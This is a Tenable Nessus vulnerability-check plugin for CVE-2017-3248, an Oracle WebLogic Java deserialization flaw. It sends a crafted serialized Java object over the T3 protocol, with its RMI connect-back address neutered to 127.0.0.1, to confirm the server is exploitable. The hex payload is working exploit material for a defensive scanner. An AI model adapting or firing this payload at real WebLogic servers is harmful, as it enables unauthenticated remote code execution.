#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(96803);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2017/04/17 14:25:41 $");

  script_cve_id("CVE-2017-3248");
  script_bugtraq_id(95465);
  script_osvdb_id(150444);
  script_xref(name:"TRA", value:"TRA-2017-07");
  script_xref(name:"ZDI", value:"ZDI-17-055");

  script_name(english:"Oracle WebLogic Java Object RMI Connect-Back Deserialization RCE (January 2017 CPU)");
  script_summary(english:"Sends a Java object to trigger an RMI Connect-Back.");

  script_set_attribute(attribute:"synopsis", value:
"The remote Oracle WebLogic server is affected by a remote code
execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Oracle WebLogic server is affected by a remote code
execution vulnerability in the Core Components subcomponent due to
unsafe deserialization of Java objects by the RMI registry. An
unauthenticated, remote attacker can exploit this, via a crafted Java
object, to execute arbitrary Java code in the context of the WebLogic
server.");
  # http://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html#AppendixFMW
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?12d40402");
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2017-07");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-17-055/");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch according to the January 2017 Oracle
Critical Patch Update advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/01/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/01/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/01/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:weblogic_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");
 
  script_dependencies("weblogic_detect.nasl");
  script_require_ports("Services/www", 80, 7001);
  script_require_keys("www/weblogic");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("t3.inc");

appname = "Oracle WebLogic Server";

get_kb_item_or_exit("www/weblogic");
port = get_http_port(default:7001);
get_kb_item_or_exit("www/weblogic/" + port + "/installed");

# Try to talk T3 to the server
sock = open_sock_tcp(port);
if (!sock) audit(AUDIT_SOCK_FAIL, port);
version = t3_connect(sock:sock);

# send ident so we can move on to login
t3_send_ident_request(sock:sock, port:port);

# send our "login request"
auth_request = '\x05\x65\x08\x00\x00\x00\x01\x00\x00\x00\x1b\x00\x00\x00\x5d\x01\x01\x00\x73\x72\x01\x78\x70\x73\x72\x02\x78\x70\x00\x00\x00\x00\x00\x00\x00\x00\x75\x72\x03\x78\x70\x00\x00\x00\x00\x78\x74\x00\x08\x77\x65\x62\x6c\x6f\x67\x69\x63\x75\x72\x04\x78\x70\x00\x00\x00\x0c\x9c\x97\x9a\x9a\x8c\x9a\x9b\xcf\xcf\x9b\x93\x9a\x74\x00\x08\x77\x65\x62\x6c\x6f\x67\x69\x63\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x10\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x56\x65\x63\x74\x6f\x72\xd9\x97\x7d\x5b\x80\x3b\xaf\x01\x03\x00\x03\x49\x00\x11\x63\x61\x70\x61\x63\x69\x74\x79\x49\x6e\x63\x72\x65\x6d\x65\x6e\x74\x49\x00\x0c\x65\x6c\x65\x6d\x65\x6e\x74\x43\x6f\x75\x6e\x74\x5b\x00\x0b\x65\x6c\x65\x6d\x65\x6e\x74\x44\x61\x74\x61\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00';
# this is a java.rmi.registry.Registry. Successful deserialization of this object
# could result in a connection to an external RMI registry. This object has an
# IP/port hardcoded to 127.0.0.1 and 0 so that it will never connect out.
auth_request += '\xac\xed\x00\x05\x73\x7d\x00\x00\x00\x01\x00\x1a\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x72\x65\x67\x69\x73\x74\x72\x79\x2e\x52\x65\x67\x69\x73\x74\x72\x79\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x72\x00\x2d\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72\x76\x65\x72\x2e\x52\x65\x6d\x6f\x74\x65\x4f\x62\x6a\x65\x63\x74\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x00\x00\x00\x00\x00\x00\x00\x02\x02\x00\x00\x78\x72\x00\x1c\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72\x76\x65\x72\x2e\x52\x65\x6d\x6f\x74\x65\x4f\x62\x6a\x65\x63\x74\xd3\x61\xb4\x91\x0c\x61\x33\x1e\x03\x00\x00\x78\x70\x77\x32\x00\x0a\x55\x6e\x69\x63\x61\x73\x74\x52\x65\x66\x00\x09\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x00\x00\x00\x00\x00\x00\x00\x00\x6e\xd6\xd9\x7b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78';
auth_request += '\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x25\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x49\x6d\x6d\x75\x74\x61\x62\x6c\x65\x53\x65\x72\x76\x69\x63\x65\x43\x6f\x6e\x74\x65\x78\x74\xdd\xcb\xa8\x70\x63\x86\xf0\xba\x0c\x00\x00\x78\x72\x00\x29\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6d\x69\x2e\x70\x72\x6f\x76\x69\x64\x65\x72\x2e\x42\x61\x73\x69\x63\x53\x65\x72\x76\x69\x63\x65\x43\x6f\x6e\x74\x65\x78\x74\xe4\x63\x22\x36\xc5\xd4\xa7\x1e\x0c\x00\x00\x78\x70\x77\x02\x06\x00\x73\x72\x00\x26\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6d\x69\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x4d\x65\x74\x68\x6f\x64\x44\x65\x73\x63\x72\x69\x70\x74\x6f\x72\x12\x48\x5a\x82\x8a\xf7\xf6\x7b\x0c\x00\x00\x78\x70\x77\x34\x00\x2eauthenticate\x28\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x73\x65\x63\x75\x72\x69\x74\x79\x2e\x61\x63\x6c\x2eUserInfo\x3b\x29\x00\x00\x00\x1b\x78\x78\xfe\x00\xff';
send_t3(sock:sock, data:auth_request);

# read in the response to our bad login request
return_val = recv_t3(sock:sock);
close(sock);

if (isnull(return_val) ||
  preg(string:return_val, pattern:'\\$Proxy[0-9]+ cannot be cast to weblogic') == FALSE)
{
  audit(AUDIT_INST_VER_NOT_VULN, appname, version);
}

report =
  '\nNessus was able to exploit a Java deserialization vulnerability by' +
  '\nsending a crafted Java object.' +
  '\n';
security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
